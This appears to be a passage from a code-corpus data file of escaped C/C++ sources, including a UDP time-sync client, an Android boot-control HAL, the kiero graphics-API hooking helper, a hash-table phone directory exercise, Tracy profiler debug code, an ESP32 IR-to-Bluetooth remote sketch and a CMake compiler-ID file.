i++)\n\t\t\t{\n\t\t\t\tSleep(TC);\n\t\t\t\t//\u043f\u043e\u0441\u044b\u043b\u0430\u0435\u043c \u0441\u0435\u0440\u0432\u0435\u0440\u0443 \u0437\u0430\u043f\u0440\u043e\u0441 \u0441\u043e \u0441\u0432\u043e\u0438\u043c \u0432\u0440\u0435\u043c\u0435\u043d\u0435\u043c\n\t\t\t\tClientTime = gs.mTime = (DWORD64)ClientTime + TC;\n\t\t\t\tsendto(clientSocket, (char*)&gs, sizeof(gs), 0, (sockaddr*)&serverParameters, sizeof(serverParameters));\n\n\t\t\t\t//\u043f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0441 \u0441\u0435\u0440\u0432\u0435\u0440\u0430 \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u0438\u0440\u043e\u0432\u043a\u0443\n\t\t\t\tint lc = sizeof(serverParameters);\n\t\t\t\tif ((recvfrom(clientSocket, (char*)&ss, sizeof(ss), NULL, (sockaddr*)&serverParameters, &lc)) == SOCKET_ERROR)\n\t\t\t\t\tthrow SetErrorMsgText(\"RecvFrom: \", WSAGetLastError());\n\n\t\t\t\tDWORD64 localUnixTime = GetLocalUnixTime();\n\t\t\t\tClientTime = (ClientTime + ss.corrTime);\n\t\t\t\tmcorr = (mcorr + ss.corrTime);\n\t\t\t\tmCcOs = (mCcOs + (ClientTime - localUnixTime));\n\t\t\t\tmaxcorr = (maxcorr < ss.corrTime) ? ss.corrTime : maxcorr;\n\t\t\t\tmincorr = (mincorr > ss.corrTime) ? ss.corrTime : mincorr;\n\n\t\t\t\tcout << \"Client time: \" << ClientTime << \" Local time: \" << localUnixTime << \" Correction: \" << ss.corrTime << endl;\n\t\t\t\tif (ClientTime > localUnixTime)\n\t\t\t\t{\n\t\t\t\t\tcout << \"The local time is \" << ClientTime - localUnixTime << \" behind of the global\" << endl;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tcout << \"The local time is \" << localUnixTime - ClientTime << \" ms ahead of the the global\" << endl;\n\t\t\t\t}\n\t\t\t\tcout << endl;\n\t\t\t}\n\t\t\tcout << endl << \"delay on the client: \" << TC << endl;\n\t\t\tcout << \"avg correction: \" << mcorr / 10.0 << endl;\n\t\t\tcout << \"avg CC - OStime: \" << mCcOs / 10.0 << endl;\n\t\t\tcout << \"max correction: \" << maxcorr << endl;\n\t\t\tcout << \"min correction: \" << mincorr << endl << endl;\n\n\t\t\tif (closesocket(clientSocket) == SOCKET_ERROR)\n\t\t\t\tthrow SetErrorMsgText(\"Closesocket: \", WSAGetLastError());\n\t\t}\n\t\tcatch (string errorMsgText)\n\t\t{\n\t\t\tcout << endl << errorMsgText << endl;\n\t\t}\n\n\t\tsystem(\"pause\");\n\t}\n\tif (WSACleanup() == SOCKET_ERROR)\n\t\tthrow SetErrorMsgText(\"Cleanup: \", WSAGetLastError());\n\treturn 0;\n}",
    "/*\n * Copyright (C) 2019 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n#include <cstdint>\n#define LOG_TAG \"android.hardware.boot@1.2-mtkimpl\"\n\n#include <memory>\n\n#include <log/log.h>\n#include <android-base/logging.h>\n#include <bootloader_message/bootloader_message.h>\n\n#include \"BootControl.h\"\n#include \"boot_region_control_private.h\"\n#include \"boot_control_definition.h\"\n\nnamespace android {\nnamespace hardware {\nnamespace boot {\nnamespace V1_2 {\nnamespace implementation {\n\nusing ::android::hardware::boot::V1_0::CommandResult;\nusing namespace android::bootable;\n\nbool BootControl::Init() {\n    return impl_.Init();\n}\n\n// Methods from ::android::hardware::boot::V1_0::IBootControl follow.\nReturn<uint32_t> BootControl::getNumberSlots() {\n    return impl_.GetNumberSlots();\n}\n\nReturn<uint32_t> BootControl::getCurrentSlot() {\n    return impl_.GetCurrentSlot();\n}\n\nReturn<void> BootControl::clearAvbbctlFlag() {\n  std::string err;\n  std::string device = get_bootloader_message_blk_device(&err);\n  if (device.empty()) {\n    LOG(ERROR) << \"Could not find bootloader message block device: \" << err;\n    return Void();\n  }\n\n  bootloader_control boot_ctrl;\n  if (!LoadBootloaderControl(device, &boot_ctrl)) {\n    LOG(ERROR) << \"Failed to load bootloader control block\";\n    return Void();\n  }\n\n  uint32_t computed_crc32 = BootloaderControlLECRC(&boot_ctrl);\n  if (boot_ctrl.crc32_le == computed_crc32 &&  boot_ctrl.reserved1[0] == 1) {\n    boot_ctrl.reserved1[0] = 0;\n    LOG(INFO) << \"Clear avb boot control convert flag\";\n    UpdateAndSaveBootloaderControl(device, &boot_ctrl);\n  }\n  return Void();\n}\n\nReturn<void> BootControl::markBootSuccessful(markBootSuccessful_cb _hidl_cb) {\n    struct CommandResult cr;\n    if (impl_.MarkBootSuccessful()) {\n        cr.success = true;\n        cr.errMsg = \"Success\";\n        clearAvbbctlFlag();\n    } else {\n        cr.success = false;\n        cr.errMsg = \"Operation failed\";\n    }\n    _hidl_cb(cr);\n    return Void();\n}\n\nReturn<void> BootControl::setActiveBootSlot(uint32_t slot, setActiveBootSlot_cb _hidl_cb) {\n    struct CommandResult cr;\n    if (impl_.SetActiveBootSlot(slot) && implext_.SetBootRegionSlot(slot)) {\n        cr.success = true;\n        cr.errMsg = \"Success\";\n    } else {\n        cr.success = false;\n        cr.errMsg = \"Operation failed\";\n    }\n    _hidl_cb(cr);\n    return Void();\n}\n\nReturn<void> BootControl::setSlotAsUnbootable(uint32_t slot, setSlotAsUnbootable_cb _hidl_cb) {\n    struct CommandResult cr;\n    if (impl_.SetSlotAsUnbootable(slot)) {\n        cr.success = true;\n        cr.errMsg = \"Success\";\n    } else {\n        cr.success = false;\n        cr.errMsg = \"Operation failed\";\n    }\n    _hidl_cb(cr);\n    return Void();\n}\n\nReturn<BoolResult> BootControl::isSlotBootable(uint32_t slot) {\n    if (!impl_.IsValidSlot(slot)) {\n        return BoolResult::INVALID_SLOT;\n    }\n    return impl_.IsSlotBootable(slot) ? BoolResult::TRUE : BoolResult::FALSE;\n}\n\nReturn<BoolResult> BootControl::isSlotMarkedSuccessful(uint32_t slot) {\n    if (!impl_.IsValidSlot(slot)) {\n        return BoolResult::INVALID_SLOT;\n    }\n    return impl_.IsSlotMarkedSuccessful(slot) ? BoolResult::TRUE : BoolResult::FALSE;\n}\n\nReturn<void> BootControl::getSuffix(uint32_t slot, getSuffix_cb _hidl_cb) {\n    hidl_string ans;\n    const char* suffix = impl_.GetSuffix(slot);\n    if (suffix) {\n        ans = suffix;\n    }\n    _hidl_cb(ans);\n    return Void();\n}\n\n// Methods from ::android::hardware::boot::V1_1::IBootControl follow.\nReturn<bool> BootControl::setSnapshotMergeStatus(MergeStatus status) {\n    return impl_.SetSnapshotMergeStatus(status);\n}\n\nReturn<MergeStatus> BootControl::getSnapshotMergeStatus() {\n    return impl_.GetSnapshotMergeStatus();\n}\n\n// Methods from ::android::hardware::boot::V1_2::IBootControl follow.\nReturn<uint32_t> BootControl::getActiveBootSlot() {\n    if (!impl_.GetActiveBootSlot()) {\n        return 0;\n    }\n    return impl_.GetActiveBootSlot();\n}\n\nIBootControl* HIDL_FETCH_IBootControl(const char* /* hal */) {\n    auto module = std::make_unique<BootControl>();\n    if (!module->Init()) {\n        ALOGE(\"Could not initialize BootControl module\");\n        return nullptr;\n    }\n    return module.release();\n}\n\n}  // namespace implementation\n}  // namespace V1_2\n}  // namespace boot\n}  // namespace hardware\n}  // namespace android\n",
    "#include \"kiero.h\"\n#include <Windows.h>\n#include <assert.h>\n\n#if KIERO_INCLUDE_D3D9\n# include <d3d9.h>\n#endif\n\n#if KIERO_INCLUDE_D3D10\n# include <dxgi.h>\n# include <d3d10_1.h>\n# include <d3d10.h>\n#endif\n\n#if KIERO_INCLUDE_D3D11\n# include <dxgi.h>\n# include <d3d11.h>\n#endif\n\n#if KIERO_INCLUDE_D3D12\n# include <dxgi.h>\n# include <d3d12.h>\n#endif\n\n#if KIERO_INCLUDE_OPENGL\n# include <gl/GL.h>\n#endif\n\n#if KIERO_INCLUDE_VULKAN\n# include <vulkan/vulkan.h>\n#endif\n\n#if KIERO_USE_MINHOOK\n# include \"minhook/include/MinHook.h\"\n#endif\n\n#ifdef _UNICODE\n# define KIERO_TEXT(text) L##text\n#else\n# define KIERO_TEXT(text) text\n#endif\n\n#define KIERO_ARRAY_SIZE(arr) ((size_t)(sizeof(arr)/sizeof(arr[0])))\n\nstatic kiero::RenderType::Enum g_renderType = kiero::RenderType::None;\nstatic uint150_t* g_methodsTable = NULL;\n\nkiero::Status::Enum kiero::init(RenderType::Enum _renderType)\n{\n\tif (g_renderType != RenderType::None)\n\t{\n\t\treturn Status::AlreadyInitializedError;\n\t}\n\n\tif (_renderType != RenderType::None)\n\t{\n\t\tif (_renderType >= RenderType::D3D9 && _renderType <= RenderType::D3D12)\n\t\t{\n\t\t\tWNDCLASSEX windowClass;\n\t\t\twindowClass.cbSize = sizeof(WNDCLASSEX);\n\t\t\twindowClass.style = CS_HREDRAW | CS_VREDRAW;\n\t\t\twindowClass.lpfnWndProc = DefWindowProc;\n\t\t\twindowClass.cbClsExtra = 0;\n\t\t\twindowClass.cbWndExtra = 0;\n\t\t\twindowClass.hInstance = GetModuleHandle(NULL);\n\t\t\twindowClass.hIcon = NULL;\n\t\t\twindowClass.hCursor = NULL;\n\t\t\twindowClass.hbrBackground = NULL;\n\t\t\twindowClass.lpszMenuName = NULL;\n\t\t\twindowClass.lpszClassName = KIERO_TEXT(\"Kiero\");\n\t\t\twindowClass.hIconSm = NULL;\n\n\t\t\t::RegisterClassEx(&windowClass);\n\n\t\t\tHWND window = ::CreateWindow(windowClass.lpszClassName, KIERO_TEXT(\"Kiero DirectX Window\"), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, NULL, NULL, windowClass.hInstance, NULL);\n\n\t\t\tif (_renderType == RenderType::D3D9)\n\t\t\t{\n#if KIERO_INCLUDE_D3D9\n\t\t\t\tHMODULE libD3D9;\n\t\t\t\tif ((libD3D9 = ::GetModuleHandle(KIERO_TEXT(\"d3d9.dll\"))) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::ModuleNotFoundError;\n\t\t\t\t}\n\n\t\t\t\tvoid* Direct3DCreate9;\n\t\t\t\tif ((Direct3DCreate9 = ::GetProcAddress(libD3D9, \"Direct3DCreate9\")) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tLPDIRECT3D9 direct3D9;\n\t\t\t\tif ((direct3D9 = ((LPDIRECT3D9(__stdcall*)(uint32_t))(Direct3DCreate9))(D3D_SDK_VERSION)) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tD3DDISPLAYMODE displayMode;\n\t\t\t\tif (direct3D9->GetAdapterDisplayMode(D3DADAPTER_DEFAULT, &displayMode) < 0)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tD3DPRESENT_PARAMETERS params;\n\t\t\t\tparams.BackBufferWidth = 0;\n\t\t\t\tparams.BackBufferHeight = 0;\n\t\t\t\tparams.BackBufferFormat = displayMode.Format;\n\t\t\t\tparams.BackBufferCount = 0;\n\t\t\t\tparams.MultiSampleType = D3DMULTISAMPLE_NONE;\n\t\t\t\tparams.MultiSampleQuality = NULL;\n\t\t\t\tparams.SwapEffect = D3DSWAPEFFECT_DISCARD;\n\t\t\t\tparams.hDeviceWindow = window;\n\t\t\t\tparams.Windowed = 1;\n\t\t\t\tparams.EnableAutoDepthStencil = 0;\n\t\t\t\tparams.AutoDepthStencilFormat = D3DFMT_UNKNOWN;\n\t\t\t\tparams.Flags = NULL;\n\t\t\t\tparams.FullScreen_RefreshRateInHz = 0;\n\t\t\t\tparams.PresentationInterval = 0;\n\n\t\t\t\tLPDIRECT3DDEVICE9 device;\n\t\t\t\tif (direct3D9->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, window, D3DCREATE_SOFTWARE_VERTEXPROCESSING | D3DCREATE_DISABLE_DRIVER_MANAGEMENT, &params, &device) < 0)\n\t\t\t\t{\n\t\t\t\t\tdirect3D9->Release();\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tg_methodsTable = (uint150_t*)::calloc(119, sizeof(uint150_t));\n\t\t\t\t::memcpy(g_methodsTable, *(uint150_t**)device, 119 * sizeof(uint150_t));\n\n#if KIERO_USE_MINHOOK\n\t\t\t\tMH_Initialize();\n#endif\n\n\t\t\t\tdirect3D9->Release();\n\t\t\t\tdirect3D9 = NULL;\n\n\t\t\t\tdevice->Release();\n\t\t\t\tdevice = NULL;\n\n\t\t\t\tg_renderType = RenderType::D3D9;\n\n\t\t\t\t::DestroyWindow(window);\n\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\n\t\t\t\treturn Status::Success;\n#endif\n\t\t\t}\n\t\t\telse if (_renderType == RenderType::D3D10)\n\t\t\t{\n#if KIERO_INCLUDE_D3D10\n\t\t\t\tHMODULE libDXGI;\n\t\t\t\tHMODULE libD3D10;\n\t\t\t\tif ((libDXGI = ::GetModuleHandle(KIERO_TEXT(\"dxgi.dll\"))) == NULL || (libD3D10 = ::GetModuleHandle(KIERO_TEXT(\"d3d10.dll\"))) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::ModuleNotFoundError;\n\t\t\t\t}\n\n\t\t\t\tvoid* CreateDXGIFactory;\n\t\t\t\tif ((CreateDXGIFactory = ::GetProcAddress(libDXGI, \"CreateDXGIFactory\")) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;",
    "#include <iostream>\r\n#include <cstring>\r\n#define max 10\r\nusing namespace std;\r\n\r\nstruct node {\r\n    char name[10];\r\n    long int mn;\r\n    node() {\r\n        mn = 0;\r\n        strcpy(name, \"--------\");\r\n    }\r\n};\r\n\r\nclass telephone {\r\npublic:\r\n    node ht[max];\r\n    int count;\r\n    telephone() {\r\n        count = 0;\r\n    }\r\n    int hashfun(long int);\r\n    void insert();\r\n    void find();\r\n    void display();\r\n    void delno();\r\n    int linearProbe(long int);\r\n    int quadraticProbe(long int);\r\n};\r\n\r\nint telephone::hashfun(long int num) {\r\n    return (num % 10);\r\n}\r\n\r\nint telephone::linearProbe(long int num) {\r\n    int index = hashfun(num);\r\n    while (ht[index].mn != 0 && ht[index].mn != num) {\r\n        index = (index + 1) % max;\r\n    }\r\n    return index;\r\n}\r\n\r\n\r\nint telephone::quadraticProbe(long int num) {\r\n    int index = hashfun(num);\r\n    int initialIndex = index; // Store initial index for wrap-around check\r\n    int i = 1;\r\n    while (ht[index].mn != 0 && ht[index].mn != num) {\r\n        index = (initialIndex + (i * i)) % max; // Calculate index using quadratic probing formula\r\n        i++;\r\n        if (index == initialIndex) // Check if we've wrapped around to the initial index\r\n            break; // Avoid infinite loop\r\n    }\r\n    if (ht[index].mn != 0) { // If slot is still occupied after probing\r\n        // Switch to linear probing\r\n        while (ht[index].mn != 0) {\r\n            index = (index + 1) % max; // Linear probing\r\n        }\r\n    }\r\n    return index;\r\n}\r\n\r\n\r\nvoid telephone::insert() {\r\n    node s;\r\n    int ind;\r\n    // long int m;\r\n    cout << \"enter name and telephone no.:\" << endl;\r\n    cin >> s.name >> s.mn;\r\n    // m = s.mn;\r\n    int choice;\r\n    cout << \"Choose probing method:\\n1. Linear Probing\\n2. Quadratic Probing\" << endl;\r\n    cin >> choice;\r\n    switch(choice) {\r\n        case 1:\r\n            ind = linearProbe(s.mn);\r\n            break;\r\n        case 2:\r\n            ind = quadraticProbe(s.mn);\r\n            break;\r\n        default:\r\n            cout << \"Invalid choice!\" << endl;\r\n            return;\r\n    }\r\n    if (ht[ind].mn == 0) {\r\n        ht[ind] = s;\r\n    } else {\r\n        cout << \"Slot is already occupied!\" << endl;\r\n    }\r\n}\r\n\r\nvoid telephone::display() {\r\n    for (int i = 0; i < max; i++) {\r\n        cout << i << \"\\t\" << ht[i].name << \"\\t\" << ht[i].mn << endl;\r\n    }\r\n}\r\n\r\nvoid telephone::find() {\r\n    long int num;\r\n    cout << \"Enter telephone number to find: \";\r\n    cin >> num;\r\n    int ind = hashfun(num);\r\n    int comparisons = 1;\r\n    while (ht[ind].mn != 0 && ht[ind].mn != num) {\r\n        ind = (ind + 1) % max;\r\n        comparisons++;\r\n    }\r\n    if (ht[ind].mn == num) {\r\n        cout << \"Found at index \" << ind << \" with \" << comparisons << \" comparisons.\" << endl;\r\n    } else {\r\n        cout << \"Not found!\" << endl;\r\n    }\r\n}\r\n\r\nvoid telephone::delno() {\r\n    long int num;\r\n    cout << \"Enter telephone number to delete: \";\r\n    cin >> num;\r\n    int ind = hashfun(num);\r\n    int comparisons = 1;\r\n    while (ht[ind].mn != num && ht[ind].mn != 0) {\r\n        ind = (ind + 1) % max;\r\n        comparisons++;\r\n    }\r\n    if (ht[ind].mn == num) {\r\n        ht[ind].mn = 0;\r\n        strcpy(ht[ind].name, \"--------\");\r\n        cout << \"Deleted at index \" << ind << \" with \" << comparisons << \" comparisons.\" << endl;\r\n    } else {\r\n        cout << \"Not found!\" << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    telephone t;\r\n    int ch;\r\n    char ans;\r\n    do {\r\n        cout << \"enter your choice\" << endl;\r\n        cout << \"1.insert\" << endl;\r\n        cout << \"2.find\" << endl;\r\n        cout << \"3.delete\" << endl;\r\n        cout << \"4.display\" << endl;\r\n        cout << \"5.exit\" << endl;\r\n        cin >> ch;\r\n        switch (ch) {\r\n            case 1:\r\n                t.insert();\r\n                break;\r\n            case 2:\r\n                t.find();\r\n                break;\r\n            case 3:\r\n                t.delno();\r\n                break;\r\n            case 4:\r\n                t.display();\r\n                break;\r\n            case 5:\r\n                return 0;\r\n            default:\r\n                cout << \"invalid choice!!!\" << endl;\r\n        }\r\n        cout << \"do you want to continue?(y/n)\";\r\n        cin >> ans;\r\n    } while (ans == 'y');\r\n    return 0;\r\n}\r\n",
    "#include <assert.h>\n#include <stdio.h>\n#include <inttypes.h>\n\n#include \"TracyEventDebug.hpp\"\n#include \"../public/common/TracyQueue.hpp\"\n\nnamespace tracy\n{\n\nvoid EventDebug( const QueueItem& ev )\n{\n    static FILE* f = fopen( \"eventdebug.txt\", \"wb\" );\n    switch( ev.hdr.type )\n    {\n    case QueueType::ZoneText:\n        fprintf( f, \"ev %i (ZoneText)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::ZoneName:\n        fprintf( f, \"ev %i (ZoneName)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::Message:\n        fprintf( f, \"ev %i (Message)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::MessageColor:\n        fprintf( f, \"ev %i (MessageColor)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::MessageCallstack:\n        fprintf( f, \"ev %i (MessageCallstack)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::MessageColorCallstack:\n        fprintf( f, \"ev %i (MessageColorCallstack)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::MessageAppInfo:\n        fprintf( f, \"ev %i (MessageAppInfo)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::ZoneBeginAllocSrcLoc:\n        fprintf( f, \"ev %i (ZoneBeginAllocSrcLoc)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::ZoneBeginAllocSrcLocCallstack:\n        fprintf( f, \"ev %i (ZoneBeginAllocSrcLocCallstack)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::CallstackSerial:\n        fprintf( f, \"ev %i (CallstackSerial)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::Callstack:\n        fprintf( f, \"ev %i (Callstack)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::CallstackAlloc:\n        fprintf( f, \"ev %i (CallstackAlloc)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::CallstackSample:\n        fprintf( f, \"ev %i (CallstackSample)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::CallstackSampleContextSwitch:\n        fprintf( f, \"ev %i (CallstackSampleContextSwitch)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::FrameImage:\n        fprintf( f, \"ev %i (FrameImage)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::ZoneBegin:\n        fprintf( f, \"ev %i (ZoneBegin)\\n\", ev.hdr.idx );\n        fprintf( f, \"\\ttime = %\" PRIi64 \"\\n\", ev.zoneBeginLean.time );\n        break;\n    case QueueType::ZoneBeginCallstack:\n        fprintf( f, \"ev %i (ZoneBeginCallstack)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::ZoneEnd:\n        fprintf( f, \"ev %i (ZoneEnd)\\n\", ev.hdr.idx );\n        fprintf( f, \"\\ttime = %\" PRIi64 \"\\n\", ev.zoneEnd.time );\n        break;\n    case QueueType::LockWait:\n        fprintf( f, \"ev %i (LockWait)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::LockObtain:\n        fprintf( f, \"ev %i (LockObtain)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::LockRelease:\n        fprintf( f, \"ev %i (LockRelease)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::LockSharedWait:\n        fprintf( f, \"ev %i (LockSharedWait)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::LockSharedObtain:\n        fprintf( f, \"ev %i (LockSharedObtain)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::LockSharedRelease:\n        fprintf( f, \"ev %i (LockSharedRelease)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::LockName:\n        fprintf( f, \"ev %i (LockName)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::MemAlloc:\n        fprintf( f, \"ev %i (MemAlloc)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::MemAllocNamed:\n        fprintf( f, \"ev %i (MemAllocNamed)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::MemFree:\n        fprintf( f, \"ev %i (MemFree)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::MemFreeNamed:\n        fprintf( f, \"ev %i (MemFreeNamed)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::MemAllocCallstack:\n        fprintf( f, \"ev %i (MemAllocCallstack)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::MemAllocCallstackNamed:\n        fprintf( f, \"ev %i (MemAllocCallstackNamed)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::MemFreeCallstack:\n        fprintf( f, \"ev %i (MemFreeCallstack)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::MemFreeCallstackNamed:\n        fprintf( f, \"ev %i (MemFreeCallstackNamed)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::GpuZoneBegin:\n        fprintf( f, \"ev %i (GpuZoneBegin)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::GpuZoneBeginCallstack:\n        fprintf( f, \"ev %i (GpuZoneBeginCallstack)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::GpuZoneBeginAllocSrcLoc:\n        fprintf( f, \"ev %i (GpuZoneBeginAllocSrcLoc)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::GpuZoneBeginAllocSrcLocCallstack:\n        fprintf( f, \"ev %i (GpuZoneBeginAllocSrcLocCallstack)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::GpuZoneEnd:\n        fprintf( f, \"ev %i (GpuZoneEnd)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::GpuZoneBeginSerial:\n        fprintf( f, \"ev %i (GpuZoneBeginSerial)\\n\", ev.hdr.idx );\n        break;\n    case QueueType::GpuZoneBeginCallstackSerial:\n        fprintf( f, \"ev %i (GpuZoneBeginCallstackSerial)\\n\", ev.h",
    "#include <Arduino.h>\n#include <BleKeyboard.h>\n#include <IRremote.hpp>\n\n// update pin number as per your ESP32 board\n#define IR_RECEIVE_PIN 15 // D15\n\nBleKeyboard bleKeyboard(\"Macro Remote\", \"onkar\", 100);\n\nvoid setup()\n{\n  // to debug the code using IDE \n  // uncomment following line and all 'Serial.println' lines\n  // Serial.begin(115200);\n\n  // Bluetooth connection indicator\n  pinMode(2, OUTPUT);\n\n  bleKeyboard.begin();\n  IrReceiver.begin(IR_RECEIVE_PIN, ENABLE_LED_FEEDBACK);\n\n  // printActiveIRProtocols(&Serial);\n  // Serial.println(\"device initialized\");\n}\n\nvoid loop()\n{\n  if (bleKeyboard.isConnected())\n  {\n    digitalWrite(2, HIGH);\n    if (IrReceiver.decode())\n    {\n      Serial.println(IrReceiver.decodedIRData.decodedRawData, HEX); // Print \"old\" raw data\n      // IrReceiver.printIRResultShort(&Serial); // Print complete received data in one line\n      // IrReceiver.printIRSendUsage(&Serial);   // Print the statement required to send this data\n      switch (IrReceiver.decodedIRData.command)\n      {\n      // *\n      case 0x16:\n        bleKeyboard.write(KEY_MEDIA_MUTE);\n        break;\n      // ok\n      case 0x1c:\n        bleKeyboard.write(KEY_MEDIA_PLAY_PAUSE);\n        break;\n      // up\n      case 0x18:\n        bleKeyboard.write(KEY_MEDIA_VOLUME_UP);\n        break;\n      // down\n      case 0x52:\n        bleKeyboard.write(KEY_MEDIA_VOLUME_DOWN);\n        break;\n      // left\n      case 0x8:\n        bleKeyboard.write(KEY_MEDIA_PREVIOUS_TRACK);\n        break;\n      // right\n      case 0x5A:\n        bleKeyboard.write(KEY_MEDIA_NEXT_TRACK);\n        break;\n      default:\n        bleKeyboard.press(KEY_RIGHT_CTRL);\n        bleKeyboard.press(KEY_RIGHT_SHIFT);\n        switch (IrReceiver.decodedIRData.command)\n        {\n          // 1\n          case 0x45:\n            bleKeyboard.press(KEY_F1);\n            break;\n          // 2\n          case 0x46:\n            bleKeyboard.press(KEY_F2);\n            break;\n          // 3\n          case 0x47:\n            bleKeyboard.press(KEY_F3);\n            break;\n          // 4\n          case 0x44:\n            bleKeyboard.press(KEY_F4);\n            break;\n          // 5\n          case 0x40:\n            bleKeyboard.press(KEY_F5);\n            break;\n          // 6\n          case 0x43:\n            bleKeyboard.press(KEY_F6);\n            break;\n          // 7\n          case 0x7:\n            bleKeyboard.press(KEY_F7);\n            break;\n          // 8\n          case 0x15:\n            bleKeyboard.press(KEY_F8);\n            break;\n          // 9\n          case 0x9:\n            bleKeyboard.press(KEY_F9);\n            break;\n          // 0 - mid volume\n          case 0x19:\n            bleKeyboard.press(KEY_F10);\n            break;\n          // # - high volume\n          case 0xD:\n            bleKeyboard.press(KEY_F11);\n            break;\n        }\n      }\n      delay(50);\n      bleKeyboard.releaseAll();\n      delay(100);\n      IrReceiver.resume();\n    }\n  }\n  else\n  {\n    digitalWrite(2, LOW);\n    delay(5000);\n  }\n}\n\n/*\nKey codes of my remote\n1 - 0x45\n2 - 0x46\n3 - 0x47\n4 - 0x44\n5 - 0x40\n6 - 0x43\n7 - 0x7\n8 - 0x15\n9 - 0x9\n* - 0x16\n0 - 0x19\n# - 0xD\nup - 0x18\ndown - 0x52\nleft - 0x8\nright - 0x5A\nok - 0x1C\n*/",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if 